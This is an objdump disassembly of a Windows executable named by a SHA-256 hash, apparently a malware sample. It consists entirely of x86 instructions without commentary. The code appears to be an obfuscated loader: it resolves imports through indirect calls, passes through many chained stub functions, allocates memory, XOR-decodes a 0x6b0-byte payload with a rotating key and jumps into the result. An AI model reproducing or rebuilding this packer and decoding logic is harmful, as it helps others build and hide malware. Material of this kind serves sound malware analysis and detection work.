
305c1dbeb808a77ead06d1afd12736cfe8a223f8793321316aae283ae4147faf.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	mov    edi,edi
  401006:	push   ebp
  401007:	mov    ebp,esp
  401009:	sub    esp,0x24
  40100c:	push   edx
  40100d:	push   DWORD PTR [edx+0x228]
  401013:	push   DWORD PTR [edx+0x144]
  401019:	call   0x4010c4
  40101e:	add    esp,0x8
  401021:	pop    edx
  401022:	push   edx
  401023:	push   0x403044
  401028:	pop    eax
  401029:	call   DWORD PTR cs:[eax]
  40102c:	pop    edx
  40102d:	push   edx
  40102e:	lea    edi,[edx]
  401030:	push   edi
  401031:	push   0x403024
  401036:	pop    eax
  401037:	call   DWORD PTR cs:[eax]
  40103a:	test   eax,eax
  40103c:	jne    0x40102e
  40103e:	pop    edx
  40103f:	sub    esp,0xffffffdc
  401042:	mov    ebp,DWORD PTR [esp]
  401045:	add    esp,0x4
  401048:	ret    
	...
  401051:	add    BYTE PTR [eax],al
  401053:	add    BYTE PTR [ebx-0x74aa9f01],cl
  401059:	in     al,dx
  40105a:	sub    esp,0x4c
  40105d:	push   edx
  40105e:	mov    eax,0x0
  401063:	push   eax
  401064:	push   0x403014
  401069:	pop    eax
  40106a:	call   DWORD PTR cs:[eax]
  40106d:	pop    edx
  40106e:	test   eax,eax
  401070:	je     0x401073
  401072:	ret    
  401073:	push   edx
  401074:	mov    edi,0x0
  401079:	push   edi
  40107a:	push   0x40305c
  40107f:	pop    eax
  401080:	call   DWORD PTR cs:[eax]
  401083:	pop    edx
  401084:	push   edx
  401085:	push   DWORD PTR [edx+0x58c]
  40108b:	push   DWORD PTR [edx+0x2a8]
  401091:	push   edi
  401092:	push   DWORD PTR [edx+0x598]
  401098:	call   0x401314
  40109d:	add    esp,0x10
  4010a0:	pop    edx
  4010a1:	mov    eax,0x403024
  4010a6:	mov    eax,DWORD PTR [eax]
  4010a8:	push   eax
  4010a9:	push   DWORD PTR [edx+0x494]
  4010af:	pop    ebx
  4010b0:	call   ebx
  4010b2:	sub    esp,0xffffffb4
  4010b5:	mov    ebp,DWORD PTR [esp]
  4010b8:	add    esp,0x4
  4010bb:	ret    
  4010bc:	ja     0x401054
  4010c2:	add    BYTE PTR [eax],al
  4010c4:	mov    edi,edi
  4010c6:	push   ebp
  4010c7:	mov    ebp,esp
  4010c9:	sub    esp,0x28
  4010cc:	push   edx
  4010cd:	push   DWORD PTR [edx+0x14]
  4010d0:	push   DWORD PTR [edx+0x4a4]
  4010d6:	call   0x401974
  4010db:	add    esp,0x8
  4010de:	pop    edx
  4010df:	push   edx
  4010e0:	push   0x0
  4010e2:	push   0x403080
  4010e7:	pop    eax
  4010e8:	call   DWORD PTR cs:[eax]
  4010eb:	pop    edx
  4010ec:	push   edx
  4010ed:	push   0x0
  4010ef:	push   0x403034
  4010f4:	pop    eax
  4010f5:	call   DWORD PTR cs:[eax]
  4010f8:	pop    edx
  4010f9:	sub    esp,0xffffffd8
  4010fc:	mov    ebp,DWORD PTR [esp]
  4010ff:	add    esp,0x4
  401102:	ret    
  401103:	add    BYTE PTR [ebx-0x1374aa01],cl
  401109:	sub    esp,0x20
  40110c:	push   edx
  40110d:	push   edi
  40110e:	push   DWORD PTR [edx+0x350]
  401114:	call   0x401ce8
  401119:	add    esp,0x8
  40111c:	pop    edx
  40111d:	push   edx
  40111e:	push   0x403038
  401123:	pop    eax
  401124:	call   DWORD PTR cs:[eax]
  401127:	pop    edx
  401128:	push   edx
  401129:	push   0x0
  40112b:	push   0x403040
  401130:	pop    eax
  401131:	call   DWORD PTR cs:[eax]
  401134:	pop    edx
  401135:	sub    esp,0xffffffe0
  401138:	mov    ebp,DWORD PTR [esp]
  40113b:	add    esp,0x4
  40113e:	ret    
  40113f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401145:	sub    esp,0x4c
  401148:	push   edx
  401149:	push   0x6b0
  40114e:	mov    ebx,0x6b0
  401153:	push   ebx
  401154:	push   0x40000
  401159:	push   0x403030
  40115e:	pop    ebx
  40115f:	push   DWORD PTR [ebx]
  401161:	sub    DWORD PTR [esp],0x2
  401165:	push   0x403000
  40116a:	pop    ebx
  40116b:	pop    DWORD PTR [ebx]
  40116d:	push   0x403000
  401172:	pop    eax
  401173:	call   DWORD PTR cs:[eax]
  401176:	xchg   DWORD PTR [esp],eax
  401179:	mov    edx,eax
  40117b:	pop    esi
  40117c:	mov    DWORD PTR [edx+0x494],esi
  401182:	mov    ecx,DWORD PTR [edx+0x494]
  401188:	lea    edi,[ecx]
  40118a:	sub    ecx,ecx
  40118c:	dec    ecx
  40118d:	and    ecx,0x401eb5
  401193:	mov    esi,DWORD PTR [ecx]
  401195:	mov    DWORD PTR [edi],esi
  401197:	add    ecx,0x3
  40119a:	add    edi,0x3
  40119d:	mov    esi,0x6a719112
  4011a2:	xor    eax,eax
  4011a4:	cmp    eax,0x6b0
  4011a9:	je     0x4011c7
  4011ab:	sub    eax,0xfffffffc
  4011ae:	mov    ebx,esi
  4011b0:	xor    ebx,DWORD PTR [ecx]
  4011b2:	sub    ebx,0x1
  4011b5:	mov    DWORD PTR [edi],ebx
  4011b7:	push   DWORD PTR [edi]
  4011b9:	mov    esi,0xfffffffc
  4011be:	sub    ecx,esi
  4011c0:	sub    edi,esi
  4011c2:	pop    esi
  4011c3:	bswap  esi
  4011c5:	jmp    0x4011a4
  4011c7:	push   edx
  4011c8:	push   0x0
  4011ca:	push   0x403010
  4011cf:	pop    eax
  4011d0:	call   DWORD PTR cs:[eax]
  4011d3:	pop    edx
  4011d4:	sub    esp,0xffffffb4
  4011d7:	pop    ebp
  4011d8:	ret    
	...
  4011e1:	add    BYTE PTR [eax],al
  4011e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4011e9:	sub    esp,0x4c
  4011ec:	push   edx
  4011ed:	push   ecx
  4011ee:	push   DWORD PTR [edx+0xd4]
  4011f4:	call   0x401d38
  4011f9:	add    esp,0x8
  4011fc:	pop    edx
  4011fd:	push   edx
  4011fe:	mov    ebx,0x0
  401203:	push   ebx
  401204:	push   0x403010
  401209:	pop    eax
  40120a:	call   DWORD PTR cs:[eax]
  40120d:	pop    edx
  40120e:	push   edx
  40120f:	push   0x0
  401211:	push   0x40302c
  401216:	pop    eax
  401217:	call   DWORD PTR cs:[eax]
  40121a:	pop    edx
  40121b:	sub    esp,0xffffffb4
  40121e:	mov    ebp,DWORD PTR [esp]
  401221:	add    esp,0x4
  401224:	ret    
  401225:	add    BYTE PTR [eax],al
  401227:	add    BYTE PTR [eax],al
  401229:	add    BYTE PTR [eax],al
  40122b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401231:	sub    esp,0x50
  401234:	push   edx
  401235:	push   0x0
  401237:	push   0x403010
  40123c:	pop    eax
  40123d:	call   DWORD PTR cs:[eax]
  401240:	pop    edx
  401241:	push   edx
  401242:	push   DWORD PTR [edx+0x320]
  401248:	push   ebx
  401249:	call   0x4014f4
  40124e:	add    esp,0x8
  401251:	pop    edx
  401252:	push   edx
  401253:	mov    edi,0x0
  401258:	push   edi
  401259:	push   0x40300c
  40125e:	pop    eax
  40125f:	call   DWORD PTR cs:[eax]
  401262:	pop    edx
  401263:	sub    esp,0xffffffb0
  401266:	mov    ebp,DWORD PTR [esp]
  401269:	add    esp,0x4
  40126c:	ret    
  40126d:	add    BYTE PTR [eax],al
  40126f:	add    BYTE PTR [eax],al
  401271:	add    BYTE PTR [eax],al
  401273:	add    BYTE PTR [ebx-0x1374aa01],cl
  401279:	sub    esp,0x3c
  40127c:	push   edx
  40127d:	push   DWORD PTR [edx+0x5a8]
  401283:	push   DWORD PTR [edx+0x394]
  401289:	push   esi
  40128a:	call   0x4016e4
  40128f:	add    esp,0xc
  401292:	pop    edx
  401293:	push   edx
  401294:	mov    ecx,0x0
  401299:	push   ecx
  40129a:	push   0x403040
  40129f:	pop    eax
  4012a0:	call   DWORD PTR cs:[eax]
  4012a3:	pop    edx
  4012a4:	push   edx
  4012a5:	mov    ecx,0x0
  4012aa:	push   ecx
  4012ab:	push   0x403034
  4012b0:	pop    eax
  4012b1:	call   DWORD PTR cs:[eax]
  4012b4:	pop    edx
  4012b5:	sub    esp,0xffffffc4
  4012b8:	mov    ebp,DWORD PTR [esp]
  4012bb:	add    esp,0x4
  4012be:	ret    
  4012bf:	add    BYTE PTR [eax],al
  4012c1:	add    BYTE PTR [eax],al
  4012c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4012c9:	sub    esp,0x44
  4012cc:	push   edx
  4012cd:	push   DWORD PTR [edx+0x48]
  4012d0:	push   eax
  4012d1:	push   DWORD PTR [edx+0x60]
  4012d4:	call   0x4019b0
  4012d9:	add    esp,0xc
  4012dc:	pop    edx
  4012dd:	push   edx
  4012de:	lea    esi,[edx]
  4012e0:	push   esi
  4012e1:	push   0x403024
  4012e6:	pop    eax
  4012e7:	call   DWORD PTR cs:[eax]
  4012ea:	test   eax,eax
  4012ec:	jne    0x4012de
  4012ee:	pop    edx
  4012ef:	push   edx
  4012f0:	mov    edx,0x0
  4012f5:	push   edx
  4012f6:	push   0x40305c
  4012fb:	pop    eax
  4012fc:	call   DWORD PTR cs:[eax]
  4012ff:	pop    edx
  401300:	sub    esp,0xffffffbc
  401303:	mov    ebp,DWORD PTR [esp]
  401306:	add    esp,0x4
  401309:	ret    
	...
  401312:	add    BYTE PTR [eax],al
  401314:	mov    edi,edi
  401316:	push   ebp
  401317:	mov    ebp,esp
  401319:	sub    esp,0x28
  40131c:	push   edx
  40131d:	push   DWORD PTR [edx+0x504]
  401323:	push   DWORD PTR [edx+0x55c]
  401329:	push   DWORD PTR [edx+0x514]
  40132f:	push   esi
  401330:	call   0x401e14
  401335:	add    esp,0x10
  401338:	pop    edx
  401339:	push   edx
  40133a:	lea    edx,[edx]
  40133c:	push   edx
  40133d:	push   0x403024
  401342:	pop    eax
  401343:	call   DWORD PTR cs:[eax]
  401346:	test   eax,eax
  401348:	jne    0x40133a
  40134a:	pop    edx
  40134b:	push   edx
  40134c:	push   0x0
  40134e:	push   0x40305c
  401353:	pop    eax
  401354:	call   DWORD PTR cs:[eax]
  401357:	pop    edx
  401358:	sub    esp,0xffffffd8
  40135b:	mov    ebp,DWORD PTR [esp]
  40135e:	add    esp,0x4
  401361:	ret    
  401362:	add    BYTE PTR [eax],al
  401364:	mov    edi,edi
  401366:	push   ebp
  401367:	mov    ebp,esp
  401369:	sub    esp,0x38
  40136c:	push   edx
  40136d:	push   0x0
  40136f:	push   0x403054
  401374:	pop    eax
  401375:	call   DWORD PTR cs:[eax]
  401378:	pop    edx
  401379:	push   edx
  40137a:	push   DWORD PTR [edx+0x414]
  401380:	push   DWORD PTR [edx+0xdc]
  401386:	push   DWORD PTR [edx+0x554]
  40138c:	call   0x401c58
  401391:	add    esp,0xc
  401394:	pop    edx
  401395:	push   edx
  401396:	push   0x0
  401398:	push   0x403010
  40139d:	pop    eax
  40139e:	call   DWORD PTR cs:[eax]
  4013a1:	pop    edx
  4013a2:	sub    esp,0xffffffc8
  4013a5:	mov    ebp,DWORD PTR [esp]
  4013a8:	add    esp,0x4
  4013ab:	ret    
	...
  4013c4:	mov    edi,edi
  4013c6:	push   ebp
  4013c7:	mov    ebp,esp
  4013c9:	sub    esp,0x2c
  4013cc:	push   edx
  4013cd:	push   edi
  4013ce:	push   DWORD PTR [edx+0x484]
  4013d4:	push   ecx
  4013d5:	push   DWORD PTR [edx+0x2e8]
  4013db:	call   0x401848
  4013e0:	add    esp,0x10
  4013e3:	pop    edx
  4013e4:	push   edx
  4013e5:	push   0x0
  4013e7:	push   0x403054
  4013ec:	pop    eax
  4013ed:	call   DWORD PTR cs:[eax]
  4013f0:	pop    edx
  4013f1:	push   edx
  4013f2:	mov    edx,0x0
  4013f7:	push   edx
  4013f8:	push   0x403040
  4013fd:	pop    eax
  4013fe:	call   DWORD PTR cs:[eax]
  401401:	pop    edx
  401402:	sub    esp,0xffffffd4
  401405:	mov    ebp,DWORD PTR [esp]
  401408:	add    esp,0x4
  40140b:	ret    
  40140c:	mov    edi,edi
  40140e:	push   ebp
  40140f:	mov    ebp,esp
  401411:	sub    esp,0x28
  401414:	push   edx
  401415:	push   DWORD PTR [edx+0x330]
  40141b:	push   eax
  40141c:	call   0x401600
  401421:	add    esp,0x8
  401424:	pop    edx
  401425:	push   edx
  401426:	push   0x403044
  40142b:	pop    eax
  40142c:	call   DWORD PTR cs:[eax]
  40142f:	pop    edx
  401430:	push   edx
  401431:	mov    edx,0x0
  401436:	push   edx
  401437:	push   0x403040
  40143c:	pop    eax
  40143d:	call   DWORD PTR cs:[eax]
  401440:	pop    edx
  401441:	sub    esp,0xffffffd8
  401444:	mov    ebp,DWORD PTR [esp]
  401447:	add    esp,0x4
  40144a:	ret    
  40144b:	add    BYTE PTR [edx+0x0],ch
  40144e:	add    DWORD PTR [esp],0x45f000
  401455:	push   DWORD PTR ds:0x40309c
  40145b:	pop    eax
  40145c:	xor    ax,ax
  40145f:	adc    eax,DWORD PTR [eax+0x3c]
  401462:	cmp    BYTE PTR [eax+0x1d],0x80
  401466:	jb     0x40146e
  401468:	pop    edx
  401469:	jmp    0x4010bc
  40146e:	xor    esp,esp
  401470:	int    0x3
  401472:	add    BYTE PTR [eax],al
  401474:	add    BYTE PTR [eax],al
  401476:	add    BYTE PTR [eax],al
  401478:	mov    edi,edi
  40147a:	push   ebp
  40147b:	mov    ebp,esp
  40147d:	sub    esp,0x34
  401480:	push   edx
  401481:	push   0x0
  401483:	push   0x40305c
  401488:	pop    eax
  401489:	call   DWORD PTR cs:[eax]
  40148c:	pop    edx
  40148d:	push   edx
  40148e:	push   DWORD PTR [edx+0x180]
  401494:	push   ebx
  401495:	call   0x401a90
  40149a:	add    esp,0x8
  40149d:	pop    edx
  40149e:	push   edx
  40149f:	push   0x0
  4014a1:	push   0x40300c
  4014a6:	pop    eax
  4014a7:	call   DWORD PTR cs:[eax]
  4014aa:	pop    edx
  4014ab:	sub    esp,0xffffffcc
  4014ae:	mov    ebp,DWORD PTR [esp]
  4014b1:	add    esp,0x4
  4014b4:	ret    
  4014b5:	add    BYTE PTR [eax],al
  4014b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4014bd:	sub    esp,0x3c
  4014c0:	push   edx
  4014c1:	push   0x0
  4014c3:	push   0x403034
  4014c8:	pop    eax
  4014c9:	call   DWORD PTR cs:[eax]
  4014cc:	pop    edx
  4014cd:	push   edx
  4014ce:	push   eax
  4014cf:	push   ebx
  4014d0:	call   0x40176c
  4014d5:	add    esp,0x8
  4014d8:	pop    edx
  4014d9:	push   edx
  4014da:	mov    ebx,0x0
  4014df:	push   ebx
  4014e0:	push   0x40305c
  4014e5:	pop    eax
  4014e6:	call   DWORD PTR cs:[eax]
  4014e9:	pop    edx
  4014ea:	sub    esp,0xffffffc4
  4014ed:	mov    ebp,DWORD PTR [esp]
  4014f0:	add    esp,0x4
  4014f3:	ret    
  4014f4:	mov    edi,edi
  4014f6:	push   ebp
  4014f7:	mov    ebp,esp
  4014f9:	sub    esp,0x24
  4014fc:	push   edx
  4014fd:	push   DWORD PTR [edx+0x298]
  401503:	push   edi
  401504:	call   0x401274
  401509:	add    esp,0x8
  40150c:	pop    edx
  40150d:	push   edx
  40150e:	mov    ebx,0x0
  401513:	push   ebx
  401514:	push   0x403034
  401519:	pop    eax
  40151a:	call   DWORD PTR cs:[eax]
  40151d:	pop    edx
  40151e:	push   edx
  40151f:	push   0x0
  401521:	push   0x403034
  401526:	pop    eax
  401527:	call   DWORD PTR cs:[eax]
  40152a:	pop    edx
  40152b:	sub    esp,0xffffffdc
  40152e:	mov    ebp,DWORD PTR [esp]
  401531:	add    esp,0x4
  401534:	ret    
  401535:	add    BYTE PTR [eax],al
  401537:	add    BYTE PTR [ebx-0x1374aa01],cl
  40153d:	sub    esp,0x4c
  401540:	push   edx
  401541:	push   esi
  401542:	push   DWORD PTR [edx+0x310]
  401548:	call   0x401364
  40154d:	add    esp,0x8
  401550:	pop    edx
  401551:	push   edx
  401552:	push   0x0
  401554:	push   0x403040
  401559:	pop    eax
  40155a:	call   DWORD PTR cs:[eax]
  40155d:	pop    edx
  40155e:	push   edx
  40155f:	lea    ebx,[edx]
  401561:	push   ebx
  401562:	push   0x403024
  401567:	pop    eax
  401568:	call   DWORD PTR cs:[eax]
  40156b:	test   eax,eax
  40156d:	jne    0x40155f
  40156f:	pop    edx
  401570:	sub    esp,0xffffffb4
  401573:	mov    ebp,DWORD PTR [esp]
  401576:	add    esp,0x4
  401579:	ret    
  40157a:	add    BYTE PTR [eax],al
  40157c:	mov    edi,edi
  40157e:	push   ebp
  40157f:	mov    ebp,esp
  401581:	sub    esp,0x20
  401584:	push   edx
  401585:	push   DWORD PTR [edx+0x5a0]
  40158b:	push   DWORD PTR [edx+0x50c]
  401591:	call   0x4015c4
  401596:	add    esp,0x8
  401599:	pop    edx
  40159a:	push   edx
  40159b:	push   0x0
  40159d:	push   0x403014
  4015a2:	pop    eax
  4015a3:	call   DWORD PTR cs:[eax]
  4015a6:	pop    edx
  4015a7:	push   edx
  4015a8:	push   0x0
  4015aa:	push   0x403040
  4015af:	pop    eax
  4015b0:	call   DWORD PTR cs:[eax]
  4015b3:	pop    edx
  4015b4:	sub    esp,0xffffffe0
  4015b7:	mov    ebp,DWORD PTR [esp]
  4015ba:	add    esp,0x4
  4015bd:	ret    
  4015be:	add    BYTE PTR [eax],al
  4015c0:	add    BYTE PTR [eax],al
  4015c2:	add    BYTE PTR [eax],al
  4015c4:	mov    edi,edi
  4015c6:	push   ebp
  4015c7:	mov    ebp,esp
  4015c9:	sub    esp,0x28
  4015cc:	push   edx
  4015cd:	push   esi
  4015ce:	push   DWORD PTR [edx+0x214]
  4015d4:	push   ecx
  4015d5:	call   0x40140c
  4015da:	add    esp,0xc
  4015dd:	pop    edx
  4015de:	push   edx
  4015df:	push   0x0
  4015e1:	push   0x40301c
  4015e6:	pop    eax
  4015e7:	call   DWORD PTR cs:[eax]
  4015ea:	pop    edx
  4015eb:	push   edx
  4015ec:	push   0x403038
  4015f1:	pop    eax
  4015f2:	call   DWORD PTR cs:[eax]
  4015f5:	pop    edx
  4015f6:	sub    esp,0xffffffd8
  4015f9:	mov    ebp,DWORD PTR [esp]
  4015fc:	add    esp,0x4
  4015ff:	ret    
  401600:	mov    edi,edi
  401602:	push   ebp
  401603:	mov    ebp,esp
  401605:	sub    esp,0x40
  401608:	push   edx
  401609:	lea    ebx,[edx]
  40160b:	push   ebx
  40160c:	push   0x403024
  401611:	pop    eax
  401612:	call   DWORD PTR cs:[eax]
  401615:	test   eax,eax
  401617:	jne    0x401609
  401619:	pop    edx
  40161a:	push   edx
  40161b:	push   DWORD PTR [edx+0x494]
  401621:	push   DWORD PTR [edx+0x44]
  401624:	push   eax
  401625:	call   0x401478
  40162a:	add    esp,0xc
  40162d:	pop    edx
  40162e:	push   edx
  40162f:	push   0x0
  401631:	push   0x40300c
  401636:	pop    eax
  401637:	call   DWORD PTR cs:[eax]
  40163a:	pop    edx
  40163b:	sub    esp,0xffffffc0
  40163e:	mov    ebp,DWORD PTR [esp]
  401641:	add    esp,0x4
  401644:	ret    
  401645:	add    BYTE PTR [eax],al
  401647:	add    BYTE PTR [ebx-0x1374aa01],cl
  40164d:	sub    esp,0x60
  401650:	push   edx
  401651:	mov    edx,0x0
  401656:	push   edx
  401657:	push   0x40305c
  40165c:	pop    eax
  40165d:	call   DWORD PTR cs:[eax]
  401660:	pop    edx
  401661:	push   edx
  401662:	push   DWORD PTR [edx+0x1fc]
  401668:	push   DWORD PTR [edx+0x70]
  40166b:	push   DWORD PTR [edx+0x3f8]
  401671:	call   0x401a40
  401676:	add    esp,0xc
  401679:	pop    edx
  40167a:	push   edx
  40167b:	mov    edx,0x0
  401680:	push   edx
  401681:	push   0x403014
  401686:	pop    eax
  401687:	call   DWORD PTR cs:[eax]
  40168a:	pop    edx
  40168b:	sub    esp,0xffffffa0
  40168e:	mov    ebp,DWORD PTR [esp]
  401691:	add    esp,0x4
  401694:	ret    
  401695:	add    BYTE PTR [eax],al
  401697:	add    BYTE PTR [ebx-0x1374aa01],cl
  40169d:	sub    esp,0x20
  4016a0:	push   edx
  4016a1:	push   DWORD PTR [edx+0x1f8]
  4016a7:	push   ecx
  4016a8:	push   ecx
  4016a9:	call   0x401b70
  4016ae:	add    esp,0xc
  4016b1:	pop    edx
  4016b2:	push   edx
  4016b3:	push   0x0
  4016b5:	push   0x403020
  4016ba:	pop    eax
  4016bb:	call   DWORD PTR cs:[eax]
  4016be:	pop    edx
  4016bf:	push   edx
  4016c0:	mov    ecx,0x0
  4016c5:	push   ecx
  4016c6:	push   0x40300c
  4016cb:	pop    eax
  4016cc:	call   DWORD PTR cs:[eax]
  4016cf:	pop    edx
  4016d0:	sub    esp,0xffffffe0
  4016d3:	mov    ebp,DWORD PTR [esp]
  4016d6:	add    esp,0x4
  4016d9:	ret    
	...
  4016e2:	add    BYTE PTR [eax],al
  4016e4:	mov    edi,edi
  4016e6:	push   ebp
  4016e7:	mov    ebp,esp
  4016e9:	sub    esp,0x48
  4016ec:	push   edx
  4016ed:	push   DWORD PTR [edx+0x4c0]
  4016f3:	push   DWORD PTR [edx+0x4bc]
  4016f9:	push   DWORD PTR [edx+0x588]
  4016ff:	call   0x401648
  401704:	add    esp,0xc
  401707:	pop    edx
  401708:	push   edx
  401709:	push   0x0
  40170b:	push   0x403014
  401710:	pop    eax
  401711:	call   DWORD PTR cs:[eax]
  401714:	pop    edx
  401715:	push   edx
  401716:	push   0x0
  401718:	push   0x40305c
  40171d:	pop    eax
  40171e:	call   DWORD PTR cs:[eax]
  401721:	pop    edx
  401722:	sub    esp,0xffffffb8
  401725:	mov    ebp,DWORD PTR [esp]
  401728:	add    esp,0x4
  40172b:	ret    
  40172c:	mov    edi,edi
  40172e:	push   ebp
  40172f:	mov    ebp,esp
  401731:	sub    esp,0x40
  401734:	push   edx
  401735:	push   DWORD PTR [edx+0x14c]
  40173b:	push   DWORD PTR [edx+0x404]
  401741:	call   0x4011e4
  401746:	add    esp,0x8
  401749:	pop    edx
  40174a:	push   edx
  40174b:	push   0x403038
  401750:	pop    eax
  401751:	call   DWORD PTR cs:[eax]
  401754:	pop    edx
  401755:	push   edx
  401756:	push   0x0
  401758:	push   0x40301c
  40175d:	pop    eax
  40175e:	call   DWORD PTR cs:[eax]
  401761:	pop    edx
  401762:	sub    esp,0xffffffc0
  401765:	mov    ebp,DWORD PTR [esp]
  401768:	add    esp,0x4
  40176b:	ret    
  40176c:	mov    edi,edi
  40176e:	push   ebp
  40176f:	mov    ebp,esp
  401771:	sub    esp,0x5c
  401774:	push   edx
  401775:	mov    ebx,0x0
  40177a:	push   ebx
  40177b:	push   0x403004
  401780:	pop    eax
  401781:	call   DWORD PTR cs:[eax]
  401784:	pop    edx
  401785:	push   edx
  401786:	push   DWORD PTR [edx+0x4b4]
  40178c:	push   DWORD PTR [edx+0xa4]
  401792:	push   DWORD PTR [edx+0x468]
  401798:	call   0x40192c
  40179d:	add    esp,0xc
  4017a0:	pop    edx
  4017a1:	push   edx
  4017a2:	push   0x0
  4017a4:	push   0x40302c
  4017a9:	pop    eax
  4017aa:	call   DWORD PTR cs:[eax]
  4017ad:	pop    edx
  4017ae:	sub    esp,0xffffffa4
  4017b1:	mov    ebp,DWORD PTR [esp]
  4017b4:	add    esp,0x4
  4017b7:	ret    
  4017b8:	mov    edi,edi
  4017ba:	push   ebp
  4017bb:	mov    ebp,esp
  4017bd:	sub    esp,0x54
  4017c0:	push   edx
  4017c1:	mov    ecx,0x0
  4017c6:	push   ecx
  4017c7:	push   0x40305c
  4017cc:	pop    eax
  4017cd:	call   DWORD PTR cs:[eax]
  4017d0:	pop    edx
  4017d1:	push   edx
  4017d2:	push   DWORD PTR [edx+0x108]
  4017d8:	push   ecx
  4017d9:	push   esi
  4017da:	push   esi
  4017db:	call   0x401800
  4017e0:	add    esp,0x10
  4017e3:	pop    edx
  4017e4:	push   edx
  4017e5:	mov    esi,0x0
  4017ea:	push   esi
  4017eb:	push   0x40302c
  4017f0:	pop    eax
  4017f1:	call   DWORD PTR cs:[eax]
  4017f4:	pop    edx
  4017f5:	sub    esp,0xffffffac
  4017f8:	mov    ebp,DWORD PTR [esp]
  4017fb:	add    esp,0x4
  4017fe:	ret    
  4017ff:	add    BYTE PTR [ebx-0x1374aa01],cl
  401805:	sub    esp,0x54
  401808:	push   edx
  401809:	mov    edi,0x0
  40180e:	push   edi
  40180f:	push   0x40305c
  401814:	pop    eax
  401815:	call   DWORD PTR cs:[eax]
  401818:	pop    edx
  401819:	push   edx
  40181a:	push   DWORD PTR [edx+0x238]
  401820:	push   ecx
  401821:	push   edi
  401822:	call   0x401140
  401827:	add    esp,0xc
  40182a:	pop    edx
  40182b:	push   edx
  40182c:	push   0x403038
  401831:	pop    eax
  401832:	call   DWORD PTR cs:[eax]
  401835:	pop    edx
  401836:	sub    esp,0xffffffac
  401839:	mov    ebp,DWORD PTR [esp]
  40183c:	add    esp,0x4
  40183f:	ret    
	...
  401848:	mov    edi,edi
  40184a:	push   ebp
  40184b:	mov    ebp,esp
  40184d:	sub    esp,0x54
  401850:	push   edx
  401851:	mov    edi,0x0
  401856:	push   edi
  401857:	push   0x403020
  40185c:	pop    eax
  40185d:	call   DWORD PTR cs:[eax]
  401860:	pop    edx
  401861:	push   edx
  401862:	push   DWORD PTR [edx+0x150]
  401868:	push   DWORD PTR [edx+0x504]
  40186e:	push   eax
  40186f:	call   0x401bfc
  401874:	add    esp,0xc
  401877:	pop    edx
  401878:	push   edx
  401879:	mov    ecx,0x0
  40187e:	push   ecx
  40187f:	push   0x40301c
  401884:	pop    eax
  401885:	call   DWORD PTR cs:[eax]
  401888:	pop    edx
  401889:	sub    esp,0xffffffac
  40188c:	mov    ebp,DWORD PTR [esp]
  40188f:	add    esp,0x4
  401892:	ret    
	...
  40189b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4018a1:	sub    esp,0x38
  4018a4:	push   edx
  4018a5:	push   DWORD PTR [edx+0x43c]
  4018ab:	push   ebx
  4018ac:	call   0x401d84
  4018b1:	add    esp,0x8
  4018b4:	pop    edx
  4018b5:	push   edx
  4018b6:	mov    eax,0x0
  4018bb:	push   eax
  4018bc:	push   0x403054
  4018c1:	pop    eax
  4018c2:	call   DWORD PTR cs:[eax]
  4018c5:	pop    edx
  4018c6:	push   edx
  4018c7:	push   0x0
  4018c9:	push   0x403010
  4018ce:	pop    eax
  4018cf:	call   DWORD PTR cs:[eax]
  4018d2:	pop    edx
  4018d3:	sub    esp,0xffffffc8
  4018d6:	mov    ebp,DWORD PTR [esp]
  4018d9:	add    esp,0x4
  4018dc:	ret    
  4018dd:	add    BYTE PTR [eax],al
  4018df:	add    BYTE PTR [eax],al
  4018e1:	add    BYTE PTR [eax],al
  4018e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4018e9:	sub    esp,0x50
  4018ec:	push   edx
  4018ed:	mov    esi,0x0
  4018f2:	push   esi
  4018f3:	push   0x403040
  4018f8:	pop    eax
  4018f9:	call   DWORD PTR cs:[eax]
  4018fc:	pop    edx
  4018fd:	push   edx
  4018fe:	push   DWORD PTR [edx+0x58c]
  401904:	push   edi
  401905:	call   0x401538
  40190a:	add    esp,0x8
  40190d:	pop    edx
  40190e:	push   edx
  40190f:	mov    edi,0x0
  401914:	push   edi
  401915:	push   0x403010
  40191a:	pop    eax
  40191b:	call   DWORD PTR cs:[eax]
  40191e:	pop    edx
  40191f:	sub    esp,0xffffffb0
  401922:	mov    ebp,DWORD PTR [esp]
  401925:	add    esp,0x4
  401928:	ret    
  401929:	add    BYTE PTR [eax],al
  40192b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401931:	sub    esp,0x3c
  401934:	push   edx
  401935:	mov    edx,0x0
  40193a:	push   edx
  40193b:	push   0x40301c
  401940:	pop    eax
  401941:	call   DWORD PTR cs:[eax]
  401944:	pop    edx
  401945:	push   edx
  401946:	push   DWORD PTR [edx+0x310]
  40194c:	push   esi
  40194d:	push   DWORD PTR [edx+0x364]
  401953:	push   ebx
  401954:	call   0x401004
  401959:	add    esp,0x10
  40195c:	pop    edx
  40195d:	push   edx
  40195e:	push   0x0
  401960:	push   0x40300c
  401965:	pop    eax
  401966:	call   DWORD PTR cs:[eax]
  401969:	pop    edx
  40196a:	sub    esp,0xffffffc4
  40196d:	mov    ebp,DWORD PTR [esp]
  401970:	add    esp,0x4
  401973:	ret    
  401974:	mov    edi,edi
  401976:	push   ebp
  401977:	mov    ebp,esp
  401979:	sub    esp,0x44
  40197c:	push   edx
  40197d:	push   ebx
  40197e:	push   ecx
  40197f:	push   edi
  401980:	call   0x40157c
  401985:	add    esp,0xc
  401988:	pop    edx
  401989:	push   edx
  40198a:	mov    ecx,0x0
  40198f:	push   ecx
  401990:	push   0x40305c
  401995:	pop    eax
  401996:	call   DWORD PTR cs:[eax]
  401999:	pop    edx
  40199a:	push   edx
  40199b:	push   0x403044
  4019a0:	pop    eax
  4019a1:	call   DWORD PTR cs:[eax]
  4019a4:	pop    edx
  4019a5:	sub    esp,0xffffffbc
  4019a8:	mov    ebp,DWORD PTR [esp]
  4019ab:	add    esp,0x4
  4019ae:	ret    
  4019af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4019b5:	sub    esp,0x30
  4019b8:	push   edx
  4019b9:	push   esi
  4019ba:	push   DWORD PTR [edx+0x500]
  4019c0:	push   DWORD PTR [edx+0x4b0]
  4019c6:	call   0x401adc
  4019cb:	add    esp,0xc
  4019ce:	pop    edx
